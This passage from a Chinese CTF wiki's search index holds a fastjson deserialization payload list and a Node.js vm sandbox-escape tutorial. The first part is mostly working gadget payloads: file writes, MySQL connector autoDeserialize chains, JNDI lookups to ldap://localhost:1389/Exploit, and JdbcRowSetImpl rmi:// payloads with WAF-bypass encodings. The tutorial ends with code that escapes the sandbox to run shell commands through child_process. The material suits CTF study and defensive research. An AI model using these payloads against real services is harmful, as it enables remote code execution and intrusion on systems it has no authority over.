\"cHduZWQ=\" , \"outputStream\" : { \"$ref\" : \"$.stream\" }, \"position\" : 5 }, \"close\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.sleepycat.bind.serial.SerialOutput\" , \"out\" : { \"$ref\" : \"$.writer\" } } } \u5199\u6587\u4ef6 { ' stream ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' java . io . FileOutputStream ' , ' file ':' / tmp / nonexist ' , ' append ' : false }, ' writer ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' org . apache . solr . common . util . FastOutputStream ' , ' tempBuffer ':' SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4 = ' , ' sink ' : { ' $ref ':' $ . stream ' }, ' start ' : 38 }, ' close ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' org . iq80 . snappy . SnappyOutputStream ' , ' out ' : { ' $ref ':' $ . writer ' } } } \u9002\u7528\u4e8ejdk8/10\u7684 { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' sun . rmi . server . MarshalOutputStream ' , ' out ' : { ' @type ':' java . util . zip . InflaterOutputStream ' , ' out ' : { ' @type ':' java . io . FileOutputStream ' , ' file ':' dst ' , ' append ' : false }, ' infl ' : { ' input ':' eJwL8nUyNDJSyCxWyEgtSgUAHKUENw == ' }, ' bufLen ' : 1048576 }, ' protocolVersion ' : 1 } 2021\u9ed1\u5e3d\u5927\u4f1a\u817e\u8baf\u7384\u6b66\u62ab\u9732 \u8be6\u7ec6\u6f0f\u6d1e\u539f\u7406\u5f85\u7814\u7a76 Mysqlconnector 5.1 . x { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.mysql.jdbc.JDBC4Connection\" , \"hostToConnectTo\" : \"mysql.host\" , \"portToConnectTo\" : 3306 , \"info\" :{ \"user\" : \u201d user \",\" password \":\u201dpass\" , \"statementInterceptors\" : \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\" , \"autoDeserialize\" : \"true\" , \"NUM_HOSTS\" : \"1\" }, \"databaseToConnectTo\" : \u201d dbname \",\" url \":\"\"} Mysqlconnector 6.0.2 or 6.0.3 {\" @type \": \" java . lang . AutoCloseable \",\" @type \": \" com . mysql . cj . jdbc . ha . LoadBalancedMySQLConnection \",\" proxy \":{\" connectionString \":{\" url \": \" jdbc : mysql : //localhost:3306/foo?allowLoadLocalInfile=true\"}}} Mysqlconnector 6. x or < 8.0.20 { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\" , \"proxy\" :{ \"@type\" : \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\" , \"connectionUrl\" :{ \"@type\" : \"com.mysql.cj.conf.url.ReplicationConnectionUrl\" , \"masters\" : [ { \"host\" : \"mysql.host\" } ] , \"slaves\" : [] , \"properties\" :{ \"host\" : \"mysql.host\" , \"user\" : \"user\" , \"dbname\" : \"dbname\" , \"password\" : \"pass\" , \"queryInterceptors\" : \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\" , \"autoDeserialize\" : \"true\" }}}}","title":"fastjson&lt;=1.2.68"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson_1","text":"\u5f85\u63a2\u7d22 { \"@type\" : \"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\" , \"tmJndiName\" : \"ldap://localhost:1389/Exploit\" , \"tmFromJndi\" : true , \"transactionManager\" : { \"$ref\" : \"$.transactionManager\" }} { \"@type\" : \"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\" , \"tmJndiName\" : \"ldap://localhost:1389/Exploit\" , \"tmFromJndi\" : true , \"transactionManager\" : { \"$ref\" : \"$.transactionManager\" }}","title":"fastjson\u672a\u77e5\u7248\u672c"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#bypasswaf","text":"Fastjson\u9ed8\u8ba4\u4f1a\u53bb\u9664\u952e\u3001\u503c\u5916\u7684\u7a7a\u683c\u3001 \\b \u3001 \\n \u3001 \\r \u3001 \\f \u7b49\uff0c\u540c\u65f6\u8fd8\u4f1a\u81ea\u52a8\u5c06\u952e\u4e0e\u503c\u8fdb\u884cunicode\u4e0e\u5341\u516d\u8fdb\u5236\u89e3\u7801\u3002 { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { /*s6*/ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \\ n \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"@type\" \\ b : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"\\u0040\\u0074\\u0079\\u0070\\u0065\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"\\x40\\x74\\x79\\x70\\x65\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true }","title":"bypasswaf"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/","text":"Nodejs \u00b6 \u5927\u7c7b\u8d44\u6599 \u00b6 Node.js \u5e38\u89c1\u6f0f\u6d1e\u5b66\u4e60\u4e0e\u603b\u7ed3 Description:\u4e00\u4f4d\u5e08\u5085\u5199\u7684Node.js\u5e38\u89c1\u6f0f\u6d1e\u603b\u7ed3\uff0c\u611f\u89c9\u6bd4\u8f83\u4e0d\u9519 \u5c0f\u7c7b\u77e5\u8bc6\u603b\u7ed3 \u00b6 \u539f\u578b\u6c61\u67d3 \u00b6 Node.js \u539f\u578b\u6c61\u67d3\u653b\u51fb\u7684\u5206\u6790\u4e0e\u5229\u7528 Description:\u4e00\u4f4d\u5e08\u5085\u5199\u7684Node.js\u539f\u578b\u6c61\u67d3\u653b\u51fb Node.js \u6c99\u76d2\u9003\u9038 Description\uff1a \u6211\u7684\u7b14\u8bb0 other \u00b6 2020-CSR-CTF-Web\u91cc\u9762\u6709\u4e00\u9053Node.JS RCE Description:\u4eceCTF\u91cc\u9762\u6da8\u59ff\u52bf JavaScript\u5b98\u7f51\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\u5199\u7684\u633a\u597d\u7684 Description:JavaScript\u5b98\u7f51\u5199\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\uff0c\u611f\u89c9\u633a\u597d\u7684 WP \u00b6 Easy-Nodejs-RCE(CTFSHOW-WEB334-337) Description:JavaScript\u5b98\u7f51\u5199\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\uff0c\u611f\u89c9\u633a\u597d\u7684 Prototype Pollution Attack Description:CTFSHOW\u5e73\u53f0WEB338-WEB344\u5173\u4e8e\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9898\u76ee","title":"Nodejs"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#nodejs","text":"","title":"Nodejs"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#_1","text":"Node.js \u5e38\u89c1\u6f0f\u6d1e\u5b66\u4e60\u4e0e\u603b\u7ed3 Description:\u4e00\u4f4d\u5e08\u5085\u5199\u7684Node.js\u5e38\u89c1\u6f0f\u6d1e\u603b\u7ed3\uff0c\u611f\u89c9\u6bd4\u8f83\u4e0d\u9519","title":"\u5927\u7c7b\u8d44\u6599"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#_2","text":"","title":"\u5c0f\u7c7b\u77e5\u8bc6\u603b\u7ed3"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#_3","text":"Node.js \u539f\u578b\u6c61\u67d3\u653b\u51fb\u7684\u5206\u6790\u4e0e\u5229\u7528 Description:\u4e00\u4f4d\u5e08\u5085\u5199\u7684Node.js\u539f\u578b\u6c61\u67d3\u653b\u51fb Node.js \u6c99\u76d2\u9003\u9038 Description\uff1a \u6211\u7684\u7b14\u8bb0","title":"\u539f\u578b\u6c61\u67d3"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#other","text":"2020-CSR-CTF-Web\u91cc\u9762\u6709\u4e00\u9053Node.JS RCE Description:\u4eceCTF\u91cc\u9762\u6da8\u59ff\u52bf JavaScript\u5b98\u7f51\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\u5199\u7684\u633a\u597d\u7684 Description:JavaScript\u5b98\u7f51\u5199\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\uff0c\u611f\u89c9\u633a\u597d\u7684","title":"other"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs/#wp","text":"Easy-Nodejs-RCE(CTFSHOW-WEB334-337) Description:JavaScript\u5b98\u7f51\u5199\u7684\u7ee7\u627f\u4e0e\u539f\u578b\u94fe\uff0c\u611f\u89c9\u633a\u597d\u7684 Prototype Pollution Attack Description:CTFSHOW\u5e73\u53f0WEB338-WEB344\u5173\u4e8e\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9898\u76ee","title":"WP"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/","text":"NodeJs\u6c99\u76d2\u9003\u9038\u5206\u6790\u53ca\u539f\u578b\u94fe\u7684\u7b80\u5355\u5b66\u4e60 \u00b6 VM\u7b80\u4ecb \u00b6 node.js \u91cc\u63d0\u4f9b\u4e86 vm \u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u4ee3\u7801\u65f6\u5019\u9694\u79bb\u5f53\u524d\u7684\u6267\u884c\u73af\u5883\uff0c\u907f\u514d\u88ab\u6076\u610f\u4ee3\u7801\u653b\u51fb\u3002 vm \u6a21\u5757\u53ef\u5728 V8 \u865a\u62df\u673a\u4e0a\u4e0b\u6587\u4e2d\u7f16\u8bd1\u548c\u8fd0\u884c\u4ee3\u7801\u3002 \u6ce8\u610f\u7684\u662f\uff1a vm \u6a21\u5757\u4e0d\u662f\u5b89\u5168\u7684\u673a\u5236\u3002 \u4e0d\u8981\u4f7f\u7528\u5b83\u6765\u8fd0\u884c\u4e0d\u53d7\u4fe1\u4efb\u7684\u4ee3\u7801\u3002 VM\u6a21\u5757 \u00b6 \u5b98\u65b9\u6587\u6863\u539f\u8bdd\uff1a \u4e00\u4e2a\u5e38\u89c1\u7684\u7528\u4f8b\u662f\u5728\u4e0d\u540c\u7684 V8 \u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4ee3\u7801\u3002 \u8fd9\u610f\u5473\u7740\u88ab\u8c03\u7528\u7684\u4ee3\u7801\u4e0e\u8c03\u7528\u7684\u4ee3\u7801\u5177\u6709\u4e0d\u540c\u7684\u5168\u5c40\u5bf9\u8c61\u3002 \u53ef\u4ee5\u901a\u8fc7\u4f7f\u5bf9\u8c61 \u4e0a\u4e0b\u6587\u9694\u79bb\u5316 \u6765\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u88ab\u8c03\u7528\u7684\u4ee3\u7801\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u4efb\u4f55\u5c5e\u6027\u90fd\u89c6\u4e3a\u5168\u5c40\u53d8\u91cf\u3002 \u7531\u8c03\u7528\u7684\u4ee3\u7801\u5f15\u8d77\u7684\u5bf9\u5168\u5c40\u53d8\u91cf\u7684\u4efb\u4f55\u66f4\u6539\u90fd\u5c06\u4f1a\u53cd\u6620\u5728\u4e0a\u4e0b\u6587\u5bf9\u8c61\u4e2d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 const vm = require ( 'vm' ); const x = 1 ; const context = { x : 2 }; vm . createContext ( context ); // \u521b\u5efa\u4e0a\u4e0b\u6587\u9694\u79bb\u5316\u5bf9\u8c61\u3002 const code = 'x += 40; var y = 17;' ; // `x` and `y` \u662f\u4e0a\u4e0b\u6587\u4e2d\u7684\u5168\u5c40\u53d8\u91cf\u3002 // \u6700\u521d\uff0cx \u7684\u503c\u4e3a 2\uff0c\u56e0\u4e3a\u8fd9\u662f context.x \u7684\u503c\u3002 vm . runInContext ( code , context ); console . log ( context . x ); // 42 console . log ( context . y ); // 17 console . log ( x ); // 1; y \u6ca1\u6709\u5b9a\u4e49\u3002 \u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5b8c\u7f8e\u7684\u8be0\u91ca\u4e86\u4e0b\u9762\u8fd9\u5f20\u56fe\u7684\u5185\u5bb9(\u5f88\u660e\u663e\u7684\u662f\u6c99\u76d2\u73af\u5883\u4ee3\u7801\u53ea\u80fd\u8bfb\u53d6 VM \u4e0a\u4e0b\u6587\u7684\u6570\u636e) \u6240\u6709\u7528 Node.js \u6240\u8fd0\u884c\u7684 JavaScript \u4ee3\u7801\u90fd\u662f\u5728\u4e00\u4e2a\u201c\u4e0a\u4e0b\u6587\u201d\u7684\u4f5c\u7528\u57df\u4e2d\u88ab\u6267\u884c\u7684\u3002 \u5b98\u65b9\u6587\u6863\u5f53\u4e2d\u6709\u8fd9\u6837\u4e00\u53e5\u8bdd \u5728 V8 \u4e2d\uff0c\u4e00\u4e2a\u4e0a\u4e0b\u6587\u662f\u4e00\u4e2a\u6267\u884c\u73af\u5883\uff0c\u5b83\u5141\u8bb8\u5206\u79bb\u7684\uff0c\u65e0\u5173\u7684 JavaScript \u5e94\u7528\u5728\u4e00\u4e2a V8 \u7684\u5355\u4f8b\u4e2d\u88ab\u8fd0\u884c\u3002 \u5fc5\u987b\u660e\u786e\u5730\u6307\u5b9a\u7528\u4e8e\u8fd0\u884c\u6240\u6709 JavaScript \u4ee3\u7801\u7684\u4e0a\u4e0b\u6587\u3002 \u5f53\u6211\u4eec\u53bb\u8c03\u7528 vm.createContext() \u65b9\u6cd5\u65f6\uff0c contextObject \u53c2\u6570\uff08\u5982\u679c contextObject \u4e3a undefined \uff0c\u5219\u4e3a\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\uff09\u5728\u5185\u90e8\u4e0e V8 \u4e0a\u4e0b\u6587\u7684\u65b0\u5b9e\u4f8b\u76f8\u5173\u8054\u3002 \u8be5 V8 \u4e0a\u4e0b\u6587\u63d0\u4f9b\u4e86\u4f7f\u7528 vm \u6a21\u5757\u7684\u65b9\u6cd5\u8fd0\u884c\u7684 code \u4ee5\u53ca\u53ef\u5728\u5176\u4e2d\u8fd0\u884c\u7684\u9694\u79bb\u7684\u5168\u5c40\u73af\u5883\u3002 \u6c99\u76d2\u6267\u884c\u4e0a\u4e0b\u6587\u662f\u9694\u79bb\u7684\uff0c\u4f46\u53ef\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u83b7\u53d6\u5230\u6c99\u76d2\u5916\u7684 Function\uff0c\u4ece\u800c\u5b8c\u6210\u9003\u9038\uff0c\u62ff\u5230\u5168\u5c40\u6570\u636e\uff0c\u793a\u4f8b\u56fe\u5982\u4e0b\uff1a \u5f53\u7136\u60f3\u8981\u7406\u89e3\u8fd8\u662f\u5f97\u6709\u4e00\u70b9\u539f\u578b\u94fe\u7684\u77e5\u8bc6\uff0c\u5b66\u4e60\u4e86\u89e3\u8fd9\u4e2a\u4e0d\u4ec5\u4ec5\u5bf9\u4eca\u5929\u7684\u77e5\u8bc6\u6709\u597d\u5904\uff0c\u4e5f\u5bf9\u4e4b\u540e\u539f\u578b\u94fe\u6c61\u67d3\u7684\u5b66\u4e60\u4e5f\u662f\u5fc5\u987b \u539f\u578b\u94fe \u00b6 \u4e00\u4e9b\u5c0f\u57fa\u7840 \u00b6 \u6211\u4eec\u9996\u5148\u5f97\u77e5\u9053\uff08\u5b98\u65b9\u6587\u6863\uff09 JavaScript \u5bf9\u8c61\u662f\u52a8\u6001\u7684\u5c5e\u6027\u201c\u5305\u201d\uff08\u6307\u5176\u81ea\u5df1\u7684\u5c5e\u6027\uff09\u3002JavaScript \u5bf9\u8c61\u6709\u4e00\u4e2a\u6307\u5411\u4e00\u4e2a\u539f\u578b\u5bf9\u8c61\u7684\u94fe\u3002\u5f53\u8bd5\u56fe\u8bbf\u95ee\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\uff0c\u5b83\u4e0d\u4ec5\u4ec5\u5728\u8be5\u5bf9\u8c61\u4e0a\u641c\u5bfb\uff0c\u8fd8\u4f1a\u641c\u5bfb\u8be5\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u4ee5\u53ca\u8be5\u5bf9\u8c61\u7684\u539f\u578b\u7684\u539f\u578b\uff0c\u4f9d\u6b21\u5c42\u5c42\u5411\u4e0a\u641c\u7d22\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u540d\u5b57\u5339\u914d\u7684\u5c5e\u6027\u6216\u5230\u8fbe\u539f\u578b\u94fe\u7684\u672b\u5c3e\u3002 \u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u5b98\u65b9\u7684\u6848\u4f8b\uff0c\u8fd9\u4e2a\u8bf7\u8ba4\u771f\u770b\uff0c\u8ba4\u771f\u5206\u6790\u5b66\u4e60\uff0c\u8fd9\u4e0e\u4e4b\u540e\u7684\u539f\u578b\u6c61\u67d3\u7684\u5b66\u4e60\u5bc6\u4e0d\u53ef\u5206 // \u4ece\u4e00\u4e2a\u51fd\u6570\u91cc\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61o\uff0c\u5b83\u81ea\u8eab\u62e5\u6709\u5c5e\u6027a\u548cb\u7684\uff1a let f = function () { this . a = 1 ; this . b = 2 ; } let o = new f (); // {a: 1, b: 2} // \u5728f\u51fd\u6570\u7684\u539f\u578b\u4e0a\u5b9a\u4e49\u5c5e\u6027 f . prototype . b = 3 ; f . prototype . c = 4 ; // \u6ce8\u610f\uff1a\u4e0d\u8981\u5728 f \u51fd\u6570\u7684\u539f\u578b\u4e0a\u76f4\u63a5\u5b9a\u4e49 f.prototype = {b:3,c:4};\u8fd9\u6837\u4f1a\u76f4\u63a5\u6253\u7834\u539f\u578b\u94fe // o.[[Prototype]] \u6709\u5c5e\u6027 b \u548c c // (\u5176\u5b9e\u5c31\u662f o.__proto__ \u6216\u8005 o.constructor.prototype) // o.[[Prototype]].[[Prototype]].[[Prototype]]\u662fnull // \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u7684\u672b\u5c3e\uff0c\u5373 null\uff0c // \u6839\u636e\u5b9a\u4e49\uff0cnull \u5c31\u662f\u6ca1\u6709 [[Prototype]]\u3002 // \u7efc\u4e0a\uff0c\u6574\u4e2a\u539f\u578b\u94fe\u5982\u4e0b: // {a:1, b:2} ---> {b:3, c:4} ---> Object.prototype---> null console . log ( o . a ); // 1 // a\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 1 console . log ( o . b ); // 2 // b\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 2 // \u539f\u578b\u4e0a\u4e5f\u6709\u4e00\u4e2a'b'\u5c5e\u6027\uff0c\u4f46\u662f\u5b83\u4e0d\u4f1a\u88ab\u8bbf\u95ee\u5230\u3002 // \u8fd9\u79cd\u60c5\u51b5\u88ab\u79f0\u4e3a\"\u5c5e\u6027\u906e\u853d (property shadowing)\" ----- \u8fd9\u4e00\u70b9\u5f88\u91cd\u8981\u6211\u4eec\u539f\u578b\u94fe\u6c61\u67d3\u7684\u65f6\u5019\u7ecf\u5e38\u4e5f\u662f\u5229\u7528\u4e86\u8fd9\u4e2a\u7279\u6027\uff0c\u5404\u79cd\u6a21\u677f\u5f15\u64ce\u7684\u539f\u578b\u6c61\u67d3\u4f60\u61c2\u7684 console . log ( o . c ); // 4 // c\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // c\u662fo.[[Prototype]]\u7684\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 4 console . log ( o . d ); // undefined // d \u662f o \u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // d \u662f o.[[Prototype]] \u7684\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // o.[[Prototype]].[[Prototype]] \u4e3a null\uff0c\u505c\u6b62\u641c\u7d22 // \u627e\u4e0d\u5230 d \u5c5e\u6027\uff0c\u8fd4\u56de undefined \u5f53\u7ee7\u627f\u7684\u51fd\u6570\u88ab\u8c03\u7528\u65f6\uff0c this \u6307\u5411\u7684\u662f\u5f53\u524d\u7ee7\u627f\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u7ee7\u627f\u7684\u51fd\u6570\u6240\u5728\u7684\u539f\u578b\u5bf9\u8c61 var o = { a : 2 , m : function (){ return this . a + 1 ; } }; console . log ( o . m ()); // 3 // \u5f53\u8c03\u7528 o.m \u65f6\uff0c'this' \u6307\u5411\u4e86 o. \u63a5\u4e0b\u6765\u6211\u4eec\u518d\u5b66\u4e60\u5b98\u65b9\u6587\u6863\u7684\u4e00\u6bb5\u4ee3\u7801\uff0c\u5f53\u7136\u5728\u5f00\u59cb\u4e4b\u524d\u6211\u4eec\u5f97\u77e5\u9053 \u88ab\u6784\u9020\u51fd\u6570\u521b\u5efa\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7684 [[Prototype]] \u6307\u5411 func \u7684 prototype \u5c5e\u6027\u3002 Object.prototype \u5c5e\u6027\u8868\u793a Object \u7684\u539f\u578b\u5bf9\u8c61\u3002 function doSomething (){} doSomething . prototype . foo = \"bar\" ; // add a property onto the prototype var doSomeInstancing = new doSomething (); doSomeInstancing . prop = \"some value\" ; // add a property onto the object console . log ( doSomeInstancing ); \u4e0b\u9762\u662f\u7ed3\u679c { prop : \"some value\" , __proto__ : { foo : \"bar\" , constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } } \u663e\u800c\u6613\u89c1\uff0c doSomeInstancing \u4e2d\u7684 __proto__ \u662f doSomething.prototype \uff0c\u63a5\u7740\u6211\u4eec\u5c1d\u8bd5\u8fd0\u884c console.log( doSomeInstancing.foo ); \u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u4e3a bar \uff0c\u8fd9\u5c31\u544a\u8bc9\u6211\u4eec doSomeInstancing \u4e2d\u7684 __proto__ \u662f doSomething.prototype . \u63a5\u4e0b\u6765\u6211\u4eec\u63a5\u7740\u8fd0\u884c console . log ( doSomething . prototype ); console . log ( doSomeInstancing ); \u5f97\u5230 { constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } { foo : \"bar\" , constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } \u8fd9\u544a\u8bc9\u4e86\u6211\u4eec\u4ec0\u4e48 doSomeInstancing \u7684 __proto__ \u540c doSomething.prototype \u56e0\u6b64\u5f53\u6211\u4eec\u8bbf\u95ee doSomeInstancing \u4e2d\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u9996\u5148\u4f1a\u67e5\u770b doSomeInstancing \u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u5c5e\u6027\u3002 \u5982\u679c doSomeInstancing \u4e0d\u5305\u542b\u5c5e\u6027\u4fe1\u606f, \u90a3\u4e48\u6d4f\u89c8\u5668\u4f1a\u5728 doSomeInstancing \u7684 __proto__ \u4e2d\u8fdb\u884c\u67e5\u627e \u5982\u679c\u5c5e\u6027\u5728 doSomeInstancing \u7684 __proto__ \u4e2d\u67e5\u627e\u5230\uff0c\u5219\u8fd4\u56de\u5b83\u3002 \u5982\u679c doSomeInstancing \u4e2d __proto__ \u4e0d\u5177\u6709\u8be5\u5c5e\u6027\uff0c\u5219\u68c0\u67e5 doSomeInstancing \u7684 __proto__ \u7684 __proto__ \u662f\u5426\u5177\u6709\u8be5\u5c5e\u6027\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4efb\u4f55\u51fd\u6570\u7684\u539f\u578b\u5c5e\u6027 __proto__ \u90fd\u662f window.Object.prototype. \u56e0\u6b64, \u901a\u8fc7 doSomeInstancing \u7684 __proto__ \u7684 __proto__ ( \u4e5f\u5c31\u662f Object.prototype ) \u6765\u67e5\u627e\u8981\u641c\u7d22\u7684\u5c5e\u6027\u3002\u5982\u679c\u518d\u627e\u4e0d\u5230 \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6d4f\u89c8\u5668\u5219\u4f1a\u65ad\u8a00\u8be5\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5e76\u7ed9\u51fa\u5c5e\u6027\u503c\u4e3a undefined \u7684\u7ed3\u8bba \u6c99\u76d2\u9003\u9038 \u00b6 \u9996\u5148\u770b\u4e0b\u5b98\u65b9\u793a\u4f8b const vm = require ( \"vm\" ); const ctx = {}; vm . runInNewContext ( 'this.constructor.constructor(\"return process\")().exit()' , ctx ); console . log ( \"Never gets executed.\" ); \u4e0a\u8ff0\u4ee3\u7801\u5728\u6267\u884c\u65f6\uff0c\u7a0b\u5e8f\u5728\u7b2c\u4e8c\u884c\u5c31\u76f4\u63a5\u9000\u51fa\uff0cvm\u865a\u62df\u673a\u73af\u5883\u4e2d\u7684\u4ee3\u7801\u9003\u9038\uff0c\u83b7\u5f97\u4e86\u4e3b\u7ebf\u7a0b\u7684 process \u53d8\u91cf\uff0c\u5e76\u8c03\u7528 process.exit()\uff0c\u9020\u6210\u4e3b\u7a0b\u5e8f\u975e\u6b63\u5e38\u9000\u51fa\u3002 \u5b83\u7b49\u540c\u4e8e const sandbox = this ; // \u83b7\u53d6Context const ObjectConstructor = this . constructor ; // \u83b7\u53d6 Object \u5bf9\u8c61\u6784\u9020\u51fd\u6570 const FunctionConstructor = ObjectConstructor . constructor ; // \u83b7\u53d6 Function \u5bf9\u8c61\u6784\u9020\u51fd\u6570 const myfun = FunctionConstructor ( 'return process' ); // \u6784\u9020\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd4\u56deprocess\u5168\u5c40\u53d8\u91cf const process = myfun (); process . exit (); \u4ee5\u4e0a\u662f\u901a\u8fc7\u539f\u578b\u94fe\u65b9\u5f0f\u5b8c\u6210\u9003\u9038\uff0c\u5982\u679c\u5c06\u4e0a\u4e0b\u6587\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u8bbe\u7f6e\u4e3a null \u4f1a\u600e\u4e48\u505a const vm = require ( \"vm\" ); const ctx = Object . create ( null ); ctx . data = {}; vm . runInNewContext ( 'this.data.constructor.constructor(\"return process\")().exit()' , ctx ); console . log ( \"Never gets executed.\" ); \u7531\u4e8e JS \u91cc\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u90fd\u4f1a\u6307\u5411 Object.prototype\uff0c\u4e14 Object.prototype \u548c Function \u4e4b\u95f4\u662f\u76f8\u4e92\u6307\u5411\u7684\uff0c\u6240\u6709\u5bf9\u8c61\u901a\u8fc7\u539f\u578b\u94fe\u90fd\u80fd\u62ff\u5230 Function\uff0c\u6700\u7ec8\u5b8c\u6210\u6c99\u76d2\u9003\u9038\u5e76\u6267\u884c\u4ee3\u7801\u3002 \u9003\u9038\u540e\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u4ee3\u7801\u62ff\u5230 require\uff0c\u4ece\u800c\u5e76\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\u529f\u80fd const vm = require ( \"vm\" ); const ctx = { console , }; vm . runInNewContext ( ` var exec = this.constructor.constructor; var require = exec('return process.mainModule.constructor._load')(); console.log(require('child_process').execSync(\"ls\").toString()); ` , ctx ); 